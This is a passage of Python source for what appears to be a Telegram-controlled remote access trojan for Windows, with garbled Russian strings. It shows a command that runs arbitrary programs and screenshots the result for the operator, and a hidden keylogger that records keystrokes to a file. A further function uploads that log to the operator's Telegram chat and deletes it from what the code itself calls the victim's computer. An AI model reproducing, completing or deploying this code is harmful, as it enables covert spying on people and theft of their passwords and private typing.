            await bot.send_message(chat_id=ID, text='–û–∫–Ω–æ –±—ã–ª–æ —É—Å–ø–µ—à–Ω–æ –∑–∞–∫—Ä—ã—Ç–æ ‚úÖ')
        except Exception as e:
            await bot.send_message(chat_id=ID, text=e)


#                               *************************************************
#                               #               COMMAND RUNPROGRAMM!!!          #
#                               ************************************************* 

async def runprogramm_command(message: types.Message):
    if len(message.text) == 12:
        await bot.send_message(chat_id=ID, text='–í–æ—Ç –ø—Ä–∏–º–µ—Ä —Ä–∞–±–æ—Ç—ã /runprogramm notepad.exe')
    else:
        try:
            programm = message.text.split()[1]
            os.system(programm)
            time.sleep(1)
            screen = ImageGrab.grab()
            screen.save(os.getcwd() + '\\sreenshot.jpg')
            f = open(os.getcwd() + '\\sreenshot.jpg',"rb")
            await bot.send_photo(ID, f, caption='–ó–∞–ø—É—Å—Ç–∏–ª)))')
            try:
                os.remove(os.getcwd() + '\\sreenshot.jpg')
            except Exception as e:
                await bot.send_message(ID, e)
                
        except Exception as e:
            print(e)
            await bot.send_message(ID, text=f'–û—à–∏–±–∫–∞: {e}')

#                               *************************************************
#                               #           COMMAND START KEYLOGGER!!!          #
#                               #           COMMAND STOP KEYLOGGER!!!!          #
#                               ************************************************* 


def keylogger():
    def on_press(key):
        if klgr == True:
            with open('keylogs.txt', 'a') as f:
                f.write(f'{key}')
                f.close()

    with Listener(on_press=on_press) as listener:
            listener.join()

async def start_keylogger(message: types.Message):
    global klgr
    klgr = True
    kernel32.CreateFileW(b'keylogs.txt', GENERIC_WRITE & GENERIC_READ, 
    FILE_SHARE_WRITE & FILE_SHARE_READ & FILE_SHARE_DELETE,
    None, CREATE_ALWAYS , 0, 0)
    Thread(target=keylogger, daemon=True).start()
    await bot.send_message(chat_id=ID, text="–ö–µ–π–ª–æ–≥–≥–µ—Ä –∑–∞–ø—É—â–µ–Ω")

async def stop_keylogger(message: types.Message):
    global klgr
    klgr = False
    await bot.send_message(chat_id=ID, text="–ö–µ–π–ª–æ–≥–≥–µ—Ä –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω.")

async def send_logs(message: types.Message):
    await bot.send_document(ID, InputFile('keylogs.txt'))
    try:
        os.remove('keylogs.txt')
    except Exception as e:
        await bot.send_message(chat_id=ID, text=f"–Ø –Ω–µ —Å–º–æ–≥ —É–¥–∞–ª–∏—Ç—å —Ñ–∞–π–ª 'keylogs.txt' –Ω–∞ –∫–æ–º–ø—å—é—Ç–µ—Ä–µ –∂–µ—Ä—Ç–≤—ã.\n–û—à–∏–±–∫–∞: {e}")